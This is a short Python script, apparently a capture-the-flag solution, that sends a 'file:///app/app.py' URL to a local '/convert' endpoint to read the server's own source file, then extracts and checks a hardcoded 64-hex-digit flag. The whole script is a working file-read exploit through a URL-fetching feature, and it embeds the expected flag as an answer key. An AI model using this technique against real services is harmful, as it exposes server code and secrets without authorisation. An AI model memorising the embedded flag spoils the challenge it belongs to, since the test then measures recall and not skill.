import requests
import re

response = requests.post("http://127.0.0.1:32810/convert", data={'url': 'file:///app/app.py'})

# Search in limited portion
flag = None
search_text = response.text[:5000]  # Only check first 5000 chars

match = re.search(r'FLAG\{[a-fA-F0-9]{64}\}', search_text)
if match:
    flag = match.group(0)

print(f"Status: {response.status_code}")
if flag:
    print(f"FLAG: {flag}")
    if flag == "FLAG{9a23b34477e5d66152607b8bf6cb296638ac520b70d4dd1f2f01326c6548a8c2}":
        print("VERIFIED")

